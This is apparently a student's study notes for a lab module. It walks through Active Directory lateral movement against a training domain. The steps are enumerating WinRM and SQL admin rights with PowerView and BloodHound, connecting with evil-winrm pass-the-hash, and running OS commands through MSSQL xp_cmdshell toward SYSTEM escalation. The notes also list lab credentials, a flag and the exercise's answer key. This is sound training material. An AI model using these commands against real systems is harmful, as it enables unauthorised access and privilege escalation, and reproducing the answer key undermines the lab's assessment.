# Section 23 — Privileged Access (RDP, WinRM, MSSQL)

---

## QUICK REFERENCE

```powershell
# Enumerate Remote Desktop Users group on a host
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# Enumerate Remote Management Users group (WinRM access) — single host
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# Enumerate Remote Management Users across ALL domain computers
Get-DomainComputer | Get-NetLocalGroupMember -GroupName "Remote Management Users" | Select ComputerName, MemberName

# WinRM — connect from Windows
$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\USER", $password)
Enter-PSSession -ComputerName TARGET -Credential $cred

# WinRM — connect from Linux
evil-winrm -i TARGET_IP -u USER -p PASSWORD
evil-winrm -i TARGET_IP -u USER -H NTLM_HASH   # pass-the-hash

# MSSQL — find instances
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

# MSSQL — connect from Linux
mssqlclient.py INLANEFREIGHT/USER@TARGET_IP -windows-auth

# MSSQL — once connected
enable_xp_cmdshell
xp_cmdshell whoami /priv
xp_cmdshell type C:\Users\TARGET\Desktop\flag.txt
```
> Quick reference for three types of remote access. Replace group names, computer names, and IPs for your target. `-H` on evil-winrm accepts an NTLM hash for pass-the-hash when you do not have the plaintext password.

**BloodHound custom Cypher queries:**
```cypher
# Find WinRM access
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# Find SQL Admin access
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
> Cypher queries for the BloodHound graph database. Paste these into the Raw Query box in the BloodHound GUI. They find users who have WinRM or SQL admin access via group membership paths.

---

## What We're Looking For

After gaining a foothold, check every account you control for three types of remote access:

| Access Type | BloodHound Edge | Group | Tool |
|-------------|----------------|-------|------|
| RDP | `CanRDP` | Remote Desktop Users | xfreerdp, mstsc.exe |
| WinRM | `CanPSRemote` | Remote Management Users | evil-winrm, Enter-PSSession |
| MSSQL sysadmin | `SQLAdmin` | — (SPN-based) | mssqlclient.py, PowerUpSQL |

**Why it matters:** Even without local admin rights, any of these gives you a shell on a new host. From there you can hunt credentials, escalate privileges, or pivot deeper into the network.

---

## Lab Attack Chain (INLANEFREIGHT.LOCAL)

```
forend / Klmcargo2
  └─ CanPSRemote → ACADEMY-EA-MS01
       └─ Enter-PSSession / evil-winrm → interactive shell on MS01

bdavis
  └─ CanPSRemote → ACADEMY-EA-DC01
       └─ WinRM access to Domain Controller

damundsen / SQL1234!
  └─ SQLAdmin → ACADEMY-EA-DB01 (172.16.5.150)
       └─ mssqlclient.py → enable_xp_cmdshell → OS command execution
            └─ flag: 1m_the_sQl_@dm1n_n0w!
            └─ SeImpersonatePrivilege → potential SYSTEM via PrintSpoofer/JuicyPotato
```

---

## Full Walkthrough with Explanations

### Step 1 — Enumerate WinRM access on MS01

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1

Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
# Result: INLANEFREIGHT\forend
```
> Lists members of the Remote Management Users group on a single host. Replace the computer name for your target. Any account listed here can open a WinRM session without needing local admin rights.
- `Remote Management Users` = the group that controls WinRM access on a host
- Membership here means the user can open a remote PS session without needing local admin
- Checking a single host is fast — but we might miss users with access on other hosts

### Step 2 — Scan ALL domain computers for WinRM access

```powershell
Get-DomainComputer | Get-NetLocalGroupMember -GroupName "Remote Management Users" | Select ComputerName, MemberName
# Results:
# ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  →  INLANEFREIGHT\bdavis
# ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL  →  INLANEFREIGHT\forend
```
> Queries every domain computer for WinRM group membership in one sweep. This is slow but thorough. It found bdavis with WinRM access to the Domain Controller (DC) — a high-value finding.
- `Get-DomainComputer` = pulls every computer object from AD
- Piped into `Get-NetLocalGroupMember` = checks the Remote Management Users group on each host
- This reveals **bdavis** has WinRM access to the Domain Controller — high value finding
- Takes a minute to run — it's querying every computer in the domain

### Step 3 — Connect via WinRM from Windows (forend → MS01)

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
# [ACADEMY-EA-MS01]: PS C:\Users\forend\Documents>
Exit-PSSession
```
> Opens an interactive PowerShell session on MS01 as forend. Replace the computer name, username, and password for your target. Use `Exit-PSSession` when done.
- `Enter-PSSession` = interactive PowerShell session on the remote host
- `-Credential` = authenticate as forend without switching your local session
- From here you can run any PS commands as if you were sitting at that machine

### Step 4 — Connect via WinRM from Linux (evil-winrm)

```bash
evil-winrm -i 10.129.x.x -u forend -p Klmcargo2
# or with hash (no plaintext needed):
evil-winrm -i 10.129.x.x -u forend -H NTLM_HASH
```
> Connects to WinRM from Linux and drops into a PowerShell shell. Use `-p` for a plaintext password or `-H` for pass-the-hash with an NTLM hash. Replace IP, username, and credentials for your target.
- evil-winrm = Linux WinRM client — gives you a PS shell on the target
- `-H` = pass-the-hash, useful when you have the NTLM hash but not the plaintext password

### Step 5 — Find MSSQL instances (PowerUpSQL)

```powershell
cd C:\Tools\PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
# Result: ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433 — service account: damundsen
```
> Queries AD for all SQL Server instances by looking for MSSQL Service Principal Names (SPNs). Shows the hostname, port, and the service account running each instance. If you control the service account, you can authenticate.
- PowerUpSQL queries AD for MSSQL SPNs — same approach as Kerberoasting enumeration
- `DomainAccount` = the AD account running the SQL service — if you have rights over this account, you can authenticate
- damundsen's password was set to `SQL1234!` via our ACL abuse chain in section 21

### Step 6 — Connect to MSSQL from Linux

```bash
# From MS01, SSH to Linux attack host
ssh htb-student@172.16.5.225
# password: HTB_@cademy_stdnt!

# Connect to MSSQL as damundsen
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
# password: SQL1234!
```
> Connects to the MSSQL server using Windows domain credentials. `-windows-auth` uses Kerberos or NTLM instead of SQL login. Replace domain, user, and IP for your target.
- `-windows-auth` = authenticate using Windows/AD credentials instead of a SQL login
- This works because damundsen has sysadmin rights on this SQL instance (SQLAdmin edge in BloodHound)

### Step 7 — Enable xp_cmdshell and execute OS commands

```sql
enable_xp_cmdshell
-- Enables the xp_cmdshell stored procedure — lets you run OS commands from SQL

xp_cmdshell whoami /priv
-- Check privileges — SQL service accounts almost always have SeImpersonatePrivilege

xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
-- Result: 1m_the_sQl_@dm1n_n0w!
```
> Enables OS command execution from inside SQL Server. `enable_xp_cmdshell` is a mssqlclient.py shortcut that runs the two required `sp_configure` commands. Check `whoami /priv` first — `SeImpersonatePrivilege` means you can escalate to SYSTEM with PrintSpoofer.
- `xp_cmdshell` = runs OS commands as the SQL Server service account (not damundsen)
- The SQL service account nearly always has `SeImpersonatePrivilege` enabled
- `SeImpersonatePrivilege` → local privesc to SYSTEM via PrintSpoofer, JuicyPotato, or RoguePotato
- `enable_xp_cmdshell` is logged in SQL error logs — noisy, use carefully on real engagements

---

## Privilege Escalation from MSSQL (SeImpersonatePrivilege)

```
SQL service account has SeImpersonatePrivilege
  └─ PrintSpoofer.exe -i -c cmd     (Windows Server 2019 / Windows 10)
  └─ JuicyPotato.exe                (older targets — Server 2016 and below)
  └─ RoguePotato                    (alternative when JuicyPotato is blocked)
       └─ NT AUTHORITY\SYSTEM
```

---

## BloodHound — Finding These Rights

```
Node Info tab → Execution Rights:
  - First Degree RDP Privileges
  - Group Delegated RDP Privileges
  - First Degree Remote PowerShell Privileges
  - SQL Admin Rights

Analysis tab pre-built queries:
  - "Find Workstations where Domain Users can RDP"
  - "Find Servers where Domain Users can RDP"
```

---

## Lab Answers

| Question | Answer |
|----------|--------|
| Other user with CanPSRemote rights | `bdavis` |
| Host bdavis can access via WinRM | `ACADEMY-EA-DC01` |
| Flag at C:\Users\damundsen\Desktop\flag.txt | `1m_the_sQl_@dm1n_n0w!` |

---

## Exam Notes

- Always enumerate RDP/WinRM/SQLAdmin rights on every account you gain — repeat after each new compromise
- `Get-DomainComputer | Get-NetLocalGroupMember` = scan the whole domain for WinRM access in one command
- BloodHound edges `CanRDP`, `CanPSRemote`, `SQLAdmin` = lateral movement without local admin
- Domain Users in Remote Desktop Users = everyone can RDP → check that host for privesc
- `evil-winrm -H HASH` = WinRM pass-the-hash from Linux — no plaintext needed
- MSSQL `xp_cmdshell` + `SeImpersonatePrivilege` = near-guaranteed path to SYSTEM
- Credentials in web.config / connection strings → test against every MSSQL instance in the domain
- PowerUpSQL `Get-SQLInstanceDomain` = find all MSSQL instances via AD SPN enumeration
- `runas /netonly` on Windows = inject creds for network auth without switching local session
